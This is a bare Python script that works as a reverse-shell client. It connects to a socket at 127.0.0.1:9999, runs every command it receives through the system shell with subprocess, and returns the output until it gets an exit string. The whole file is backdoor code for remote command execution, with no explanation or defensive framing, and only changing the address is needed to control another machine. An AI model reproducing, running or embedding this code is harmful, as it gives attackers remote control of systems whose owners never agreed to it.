import socket
import os
import subprocess

ip_port = ('127.0.0.1', 9999)
s = socket.socket()  
s.connect(ip_port)

while True:   
    re = s.recv(2048).decode()
    if re =='exit && echo [+] Command Request Done!':
        s.close()
        break
#    elif (os.system(re)) != 0:
#        s.send(("no cammand").encode("big5"))
    elif re != '':
        a = (subprocess.Popen(re,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,close_fds=True))
        a.wait()
        b = a.stdout.read()
        if(b.decode('utf-8','ignore') == ''):
            s.send(("no cammand").encode("big5"))
        s.send(b)

s.close()
